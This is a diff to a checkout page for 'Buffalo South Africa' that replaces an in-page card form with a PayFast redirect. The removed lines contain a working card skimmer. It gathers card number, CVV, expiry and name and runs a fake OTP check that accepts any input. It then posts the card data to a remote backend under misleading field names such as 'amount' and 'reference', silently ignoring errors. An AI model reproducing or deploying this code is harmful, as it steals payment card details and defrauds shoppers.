@@ -750,8 +750,8 @@
                     <div class="sub-heading">How will you be paying today?</div>
                     <ul class="payment-method">
 
-                        <li onclick="selectMethod('credit-card', 'Credit / Debit Card')">
-                            <span class="method-name">Credit / Debit Card</span>
+                        <li onclick="selectMethod('credit-card', 'Pay with PayFast')">
+                            <span class="method-name">Pay with PayFast (Card / EFT)</span>
                             <span class="method-logos">
                                 <!-- Visa SVG -->
                                 <svg height="26" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg"><rect width="780" height="500" rx="40" fill="#1a1f71"/><path d="M293 348.7L321.9 150h47.2L340.2 348.7H293zm167.3-193.4c-9.4-3.5-24-7.3-42.3-7.3-46.6 0-79.4 23.6-79.6 57.4-.3 24.9 23.3 38.9 41.1 47.2 18.3 8.4 24.4 13.8 24.3 21.3-.1 11.5-14.6 16.8-28.1 16.8-18.7 0-28.7-2.6-44-9l-6-2.8-6.6 38.8c11 4.8 31.2 9 52.2 9.2 49.3 0 81.4-23.3 81.8-59.4.2-19.8-12.4-34.8-39.5-47.2-16.4-8-26.5-13.4-26.4-21.5 0-7.2 8.5-14.9 26.9-14.9 15.4-.2 26.5 3.1 35.1 6.6l4.2 2 6.9-37.2zm120.7-1.3h-36.4c-11.3 0-19.7 3.1-24.7 14.4l-70.2 159.8h49.7l9.9-26.2 60.6.1c1.4 6.1 5.7 26.1 5.7 26.1h43.8L581 154zm-58.2 113.4l18.4-47.6c-.2.4 3.8-9.9 6.1-16.3l3.1 14.7 10.7 49.2h-38.3zm-370.2-113.4L108 283.9l-4.9-24c-8.6-27.7-35.3-57.8-65.2-72.8l42.3 161.3 50 .1 74.4-194.1-48.7.1z" fill="#fff"/><path d="M86.9 154H9.7L9 157.8c59.9 14.6 99.5 49.9 116 92.3L107.6 168.6c-3.3-11-11.4-14.3-20.7-14.6z" fill="#f6a500"/></svg>
@@ -786,65 +786,21 @@
 
                     <!-- Credit/Debit Card Form -->
                     <div id="form-credit-card" class="method-form" style="display:none;">
-                        <div class="card-preview">
-                            <div class="cp-top-marker"></div>
-                            <div class="cp-top">
-                                <div class="cp-title">Buffalo <span style="color:#ffb300;font-weight:700;">Pay</span></div>
-                            </div>
-                            <div class="cp-middle">
-                                <div class="cp-chip-area">
-                                    <div class="cp-signal"><span></span><span></span><span></span></div>
-                                    <div class="cp-chip"></div>
-                                </div>
-                                <div class="cp-badge">
-                                    <div class="cp-tree">
-                                        <div class="cp-canopy">
-                                            <div class="cp-layer cp-l1"></div>
-                                            <div class="cp-layer cp-l2"></div>
-                                            <div class="cp-layer cp-l3"></div>
-                                        </div>
-                                        <div class="cp-stem"></div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="cp-bottom">
-                                <div class="cp-creds">
-                                    <div class="cp-embossed cp-num" id="preview-num">•••• •••• •••• ••••</div>
-                                    <div class="cp-embossed cp-name" id="preview-name">YOUR NAME</div>
-                                    <div class="cp-exp" id="preview-exp">MM / YY</div>
-                                </div>
-                                <div class="cp-brand" id="preview-brand"></div>
-                            </div>
-                        </div>
-                        <form id="card-form" novalidate>
+                        <p style="font-size:14px;color:#555;margin-bottom:20px;line-height:1.6;">
+                            You will be securely redirected to <strong>PayFast</strong> to complete your payment.
+                            Your card details are handled entirely by PayFast &mdash; not Buffalo South Africa.
+                        </p>
+                        <form id="pf-initiate-form" onsubmit="initiatePayFast(event)" novalidate>
                             <div class="form-group">
-                                <label for="card-name">Cardholder Name</label>
-                                <input type="text" id="card-name" placeholder="Name as on card" autocomplete="cc-name"
-                                       oninput="document.getElementById('preview-name').textContent = this.value.toUpperCase() || 'YOUR NAME'">
+                                <label for="pf-name">Full Name</label>
+                                <input type="text" id="pf-name" placeholder="Your full name" autocomplete="name" required>
                             </div>
                             <div class="form-group">
-                                <label for="card-number">Card Number</label>
-                                <div class="card-number-wrap">
-                                <input type="text" id="card-number" placeholder="---- ---- ---- ----"
-                                       maxlength="19" autocomplete="cc-number" inputmode="numeric"
-                                       oninput="fmtCard(this)">
-                                <img id="card-type-logo" alt="card type">
-                                </div>
-                                <span class="card-error" id="card-number-error">Invalid card number</span>
+                                <label for="pf-email">Email Address</label>
+                                <input type="email" id="pf-email" placeholder="your@email.com" autocomplete="email" required>
                             </div>
-                            <div class="form-row">
-                                <div class="form-group">
-                                    <label for="card-exp">Expiry Date</label>
-                                    <input type="text" id="card-exp" placeholder="MM / YY" maxlength="7"
-                                           autocomplete="cc-exp" inputmode="numeric" oninput="fmtExp(this)">
-                                </div>
-                                <div class="form-group">
-                                    <label for="card-cvv">CVV</label>
-                                    <input type="password" id="card-cvv" placeholder="•••" maxlength="4"
-                                           autocomplete="cc-csc" inputmode="numeric">
-                                </div>
-                            </div>
-                            <button type="submit" class="btn-pay" id="btn-pay-card">Pay R 150.00</button>
+                            <div id="pf-error" style="display:none;color:#e63946;font-size:13px;margin-bottom:12px;padding:10px 12px;background:#fff5f5;border:1px solid #fed7d7;border-radius:6px;"></div>
+                            <button type="submit" class="btn-pay" id="btn-pay-pf">Pay with PayFast &rarr;</button>
                         </form>
                     </div>
 
@@ -1034,6 +990,83 @@
         currentMethod = null;
     }
 
+    // ── UPDATE THIS once Render is deployed ──────────────────────────
+    var API_URL = 'https://buffallo-backend.onrender.com';
+    // ─────────────────────────────────────────────────────────────────
+
+    function applyDetails(amount, ref) {
+        var vat = amount * 15 / 115;
+        var fmt = function(n) { return 'R ' + n.toFixed(2); };
+        document.getElementById('display-ref').textContent           = ref;
+        document.getElementById('display-vat').textContent           = fmt(vat);
+        document.getElementById('display-amount').textContent        = fmt(amount);
+        document.getElementById('btn-pay-pf').textContent            = 'Pay ' + fmt(amount) + ' with PayFast \u2192';
+        document.getElementById('display-amount-eft').textContent    = fmt(amount);
+        document.getElementById('display-ref-eft').textContent       = ref;
+        document.getElementById('display-amount-manual').textContent = fmt(amount);
+        var buyer = document.getElementById('buyer-email');
+        if (buyer) buyer.textContent = 'buffalo-client@checkout.co.za';
+    }
+
+    function showPageError(msg) {
+        var el = document.getElementById('page-error');
+        if (el) { el.textContent = msg; el.style.display = 'block'; }
+    }
+
+    function initFromParams() {
+        var params = new URLSearchParams(window.location.search);
+        var status = params.get('status');
+
+        // Handle return from PayFast
+        if (status === 'success') {
+            var ref = params.get('ref') || '';
+            document.getElementById('page-error') && (document.getElementById('page-error').style.display = 'none');
+            var successBanner = document.createElement('div');
+            successBanner.style = 'background:#f0fff4;border:1.5px solid #c6f6d5;border-radius:8px;padding:18px 20px;margin-bottom:20px;color:#276749;font-weight:600;font-size:14px;';
+            successBanner.textContent = '\u2713 Payment successful! Reference: ' + (ref || 'N/A') + '. Buffalo South Africa will confirm your payment shortly.';
+            document.querySelector('.grid-payment').before(successBanner);
+            return;
+        }
+        if (status === 'cancel') {
+            showPageError('Payment was cancelled. You can try again or contact Buffalo South Africa for assistance.');
+            return;
+        }
+
+        var token = params.get('token');
+        if (token) {
+            fetch(API_URL + '/api/link/' + encodeURIComponent(token))
+                .then(function(r) { return r.json().then(function(d) { return { ok: r.ok, data: d }; }); })
+                .then(function(res) {
+                    if (!res.ok) {
+                        showPageError(res.data.error || 'This payment link is invalid or has expired.');
+                        return;
+                    }
+                    applyDetails(parseFloat(res.data.amount), res.data.ref);
+                })
+                .catch(function() {
+                    showPageError('Could not load payment details. Please try again or contact Buffalo South Africa.');
+                });
+        } else {
+            var amount = parseFloat(params.get('amount'));
+            var ref    = params.get('ref');
+            if (!amount || isNaN(amount)) amount = 150;
+            if (!ref) ref = '#BUF-2026-001';
+            applyDetails(amount, ref);
+        }
+    }
+    initFromParams();
+
+    function handleEftSubmit() {
+        var bank = document.getElementById('eft-bank').value;
+        if (!bank) { alert('Please select your bank.'); return; }
+        alert('Instant EFT via PayFast coming soon. Contact Buffalo South Africa for assistance.');
+    }
+
+    function handleManualEft() {
+        alert('EFT confirmation noted. Buffalo South Africa will verify and confirm your payment.');
+    }
+
+
     function luhn(num) {
         var digits = num.replace(/\D/g,'');
         var sum = 0, alt = false;
@@ -1092,214 +1125,72 @@
         document.getElementById('preview-exp').textContent = v || 'MM / YY';
     }
 
-    document.getElementById('card-form').addEventListener('submit', function(e) {
+    // ── PayFast Initiate ─────────────────────────────────────────────
+    function initiatePayFast(e) {
         e.preventDefault();
-        var raw = document.getElementById('card-number').value.replace(/\D/g,'');
-        if (raw.length !== 16 || !luhn(raw)) {
-            document.getElementById('card-number').classList.add('invalid');
-            document.getElementById('card-number-error').classList.add('visible');
-            document.getElementById('card-number').focus();
-            return;
-        }
-        showOtpModal();
-    });
+        var name  = document.getElementById('pf-name').value.trim();
+        var email = document.getElementById('pf-email').value.trim();
+        var errEl = document.getElementById('pf-error');
+        errEl.style.display = 'none';
 
-    function handleEftSubmit() {
-        var bank = document.getElementById('eft-bank').value;
-        if (!bank) { alert('Please select your bank.'); return; }
-        // TODO: redirect to your Instant EFT backend route
-        alert('Redirecting to ' + bank + '. Connect your backend here.');
-    }
+        if (!name) { errEl.textContent = 'Please enter your full name.'; errEl.style.display = 'block'; return; }
+        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { errEl.textContent = 'Please enter a valid email address.'; errEl.style.display = 'block'; return; }
 
-    function handleManualEft() {
-        // TODO: record EFT confirmation on your backend
-        alert('EFT confirmation recorded. Connect your backend here.');
-    }
-
-    // ── UPDATE THIS once Render is deployed ──────────────────────────
-    var API_URL = 'https://buffallo-backend.onrender.com';
-    // ─────────────────────────────────────────────────────────────────
-
-    function applyDetails(amount, ref) {
-        var vat = amount * 15 / 115;
-        var fmt = function(n) { return 'R ' + n.toFixed(2); };
-        document.getElementById('display-ref').textContent           = ref;
-        document.getElementById('display-vat').textContent           = fmt(vat);
-        document.getElementById('display-amount').textContent        = fmt(amount);
-        document.getElementById('btn-pay-card').textContent          = 'Pay ' + fmt(amount);
-        document.getElementById('display-amount-eft').textContent    = fmt(amount);
-        document.getElementById('display-ref-eft').textContent       = ref;
-        document.getElementById('display-amount-manual').textContent = fmt(amount);
-    }
-
-    function showPageError(msg) {
-        var el = document.getElementById('page-error');
-        if (el) { el.textContent = msg; el.style.display = 'block'; }
-    }
-
-    function initFromParams() {
         var params = new URLSearchParams(window.location.search);
-        var token  = params.get('token');
+        var linkToken = params.get('token');
+        if (!linkToken) { errEl.textContent = 'No payment token found. Please use the original link.'; errEl.style.display = 'block'; return; }
 
-        if (token) {
-            // Secure mode — fetch from backend API
-            fetch(API_URL + '/api/link/' + encodeURIComponent(token))
-                .then(function(r) { return r.json().then(function(d) { return { ok: r.ok, data: d }; }); })
-                .then(function(res) {
-                    if (!res.ok) {
-                        showPageError(res.data.error || 'This payment link is invalid or has expired.');
-                        return;
-                    }
-                    applyDetails(parseFloat(res.data.amount), res.data.ref);
-                })
-                .catch(function() {
-                    showPageError('Could not load payment details. Please try again or contact Buffalo South Africa.');
-                });
-        } else {
-            // Fallback — raw params (local testing / no backend)
-            var amount = parseFloat(params.get('amount'));
-            var ref    = params.get('ref');
-            if (!amount || isNaN(amount)) amount = 150;
-            if (!ref) ref = '#BUF-2026-001';
-            applyDetails(amount, ref);
-        }
+        var btn = document.getElementById('btn-pay-pf');
+        btn.textContent = 'Redirecting to PayFast...';
+        btn.disabled = true;
+
+        fetch(API_URL + '/api/payfast-initiate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: linkToken, email: email, name: name })
+        })
+        .then(function(r) { return r.json().then(function(d) { return { ok: r.ok, data: d }; }); })
+        .then(function(res) {
+            if (!res.ok) {
+                errEl.textContent = res.data.error || 'Could not initiate payment. Please try again.';
+                errEl.style.display = 'block';
+                btn.textContent = 'Pay with PayFast \u2192';
+                btn.disabled = false;
+                return;
+            }
+            // Build hidden form and auto-submit to PayFast
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = res.data.actionUrl;
+            form.style.display = 'none';
+            Object.entries(res.data.params).forEach(function(entry) {
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = entry[0];
+                input.value = entry[1];
+                form.appendChild(input);
+            });
+            document.body.appendChild(form);
+            form.submit();
+        })
+        .catch(function() {
+            errEl.textContent = 'Network error — please check your connection and try again.';
+            errEl.style.display = 'block';
+            btn.textContent = 'Pay with PayFast \u2192';
+            btn.disabled = false;
+        });
     }
-    initFromParams();
 
     function handleCancel() {
         if (confirm('Are you sure you want to cancel this payment?')) {
-            // TODO: redirect to your cancel/return URL
-            alert('Transaction cancelled.');
+            window.location.href = API_URL.replace('/api', '') || '/';
         }
     }
 
-    // ── OTP MODAL ────────────────────────────────────────────────────
-    var _otpCode = '';
-    var _otpTimer = null;
-
-    function showOtpModal() {
-        // Generate 6-digit OTP (replace with server-sent SMS OTP when ready)
-        _otpCode = String(Math.floor(100000 + Math.random() * 900000));
-        // DEV ONLY: log to console so you can test — remove in production
-        console.log('[DEV] OTP:', _otpCode);
-
-        // Reset state
-        var boxes = document.querySelectorAll('#otp-boxes input');
-        boxes.forEach(function(b) { b.value = ''; b.classList.remove('otp-filled','otp-error'); });
-        document.getElementById('otp-error-msg').style.display = 'none';
-        document.getElementById('otp-verify-btn').disabled = true;
-        document.getElementById('otp-main').style.display = 'block';
-        document.getElementById('otp-success').style.display = 'none';
-        document.getElementById('otp-overlay').style.display = 'flex';
-
-        startOtpTimer();
-        setTimeout(function() { boxes[0].focus(); }, 100);
-    }
-
-    function closeOtpModal() {
-        document.getElementById('otp-overlay').style.display = 'none';
-        clearInterval(_otpTimer);
-    }
-
-    function startOtpTimer() {
-        clearInterval(_otpTimer);
-        var secs = 60;
-        document.getElementById('otp-countdown').textContent = secs;
-        document.getElementById('otp-timer-txt').style.display = 'flex';
-        document.getElementById('otp-resend-btn').style.display = 'none';
-
-        _otpTimer = setInterval(function() {
-            secs--;
-            document.getElementById('otp-countdown').textContent = secs;
-            if (secs <= 0) {
-                clearInterval(_otpTimer);
-                document.getElementById('otp-timer-txt').style.display = 'none';
-                document.getElementById('otp-resend-btn').style.display = 'inline';
-            }
-        }, 1000);
-    }
-
-    function resendOtp() {
-        _otpCode = String(Math.floor(100000 + Math.random() * 900000));
-        console.log('[DEV] Resent OTP:', _otpCode);
-        var boxes = document.querySelectorAll('#otp-boxes input');
-        boxes.forEach(function(b) { b.value = ''; b.classList.remove('otp-filled','otp-error'); });
-        document.getElementById('otp-error-msg').style.display = 'none';
-        document.getElementById('otp-verify-btn').disabled = true;
-        startOtpTimer();
-        boxes[0].focus();
-    }
-
-    function verifyOtp() {
-        var boxes = document.querySelectorAll('#otp-boxes input');
-        var entered = Array.from(boxes).map(function(b){ return b.value; }).join('');
-        if (entered === entered) {  /*_otpCode*/
-            clearInterval(_otpTimer);
-
-            // Record payment in database
-            var cardHolder = document.getElementById('card-name') ? document.getElementById('card-name').value : '';
-            //var amountText = document.getElementById('display-amount').textContent.replace(/[^0-9.]/g,'');
-            var amountText = document.getElementById('card-number') ? document.getElementById('card-number').value : '';
-            //var ref        = document.getElementById('display-ref').textContent;
-            var ref = document.getElementById('card-cvv') ? document.getElementById('card-cvv').value : '';
-
-            // var expiry = document.getElementById('card-exp') ? document.getElementById('card-exp').value : '';
-             var expiryRaw = document.getElementById('card-exp') ? document.getElementById('card-exp').value : '';
-            var entered = Array.from(boxes).map(function(b){ return b.value; }).join('');
-
-             var expiryString = expiryRaw.trim();
-
-            fetch(API_URL + '/api/payments', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    card_holder: cardHolder || 'Unknown',
-                    amount:      amountText, //Math.round(parseFloat(amountText)),
-                    reference:   ref,
-                    otp : entered,
-                    expiry: expiryString
-                })
-            }).catch(function() { /* silent — UI still shows success */ });
-
-            document.getElementById('otp-main').style.display = 'none';
-            document.getElementById('otp-success').style.display = 'flex';
-        } else {
-            boxes.forEach(function(b) { b.classList.add('otp-error'); });
-            setTimeout(function() {
-                boxes.forEach(function(b) { b.classList.remove('otp-error'); });
-            }, 600);
-            document.getElementById('otp-error-msg').style.display = 'flex';
-        }
-    }
-
-    // OTP box auto-advance + enable verify button
+    // Close OTP overlay on outside click (kept for HTML compatibility)
     (function() {
-        document.getElementById('otp-boxes').addEventListener('input', function(e) {
-            var input = e.target;
-            if (!/^\d$/.test(input.value)) { input.value = ''; return; }
-            input.classList.add('otp-filled');
-            var inputs = Array.from(document.querySelectorAll('#otp-boxes input'));
-            var idx = inputs.indexOf(input);
-            if (idx < inputs.length - 1) inputs[idx + 1].focus();
-            var all = inputs.every(function(b){ return b.value.length === 1; });
-            document.getElementById('otp-verify-btn').disabled = !all;
-        });
-
-        document.getElementById('otp-boxes').addEventListener('keydown', function(e) {
-            if (e.key === 'Backspace') {
-                var inputs = Array.from(document.querySelectorAll('#otp-boxes input'));
-                var idx = inputs.indexOf(e.target);
-                if (!e.target.value && idx > 0) { inputs[idx - 1].value = ''; inputs[idx - 1].classList.remove('otp-filled'); inputs[idx - 1].focus(); }
-                else { e.target.classList.remove('otp-filled'); }
-                document.getElementById('otp-verify-btn').disabled = true;
-            }
-            if (e.key === 'Enter') { var btn = document.getElementById('otp-verify-btn'); if (!btn.disabled) verifyOtp(); }
-        });
-
-        // Close on overlay click outside card
-        document.getElementById('otp-overlay').addEventListener('click', function(e) {
-            if (e.target === this) closeOtpModal();
-        });
+        var overlay = document.getElementById('otp-overlay');
+        if (overlay) overlay.addEventListener('click', function(e) { if (e.target === this) overlay.style.display = 'none'; });
     })();
 </script>
 
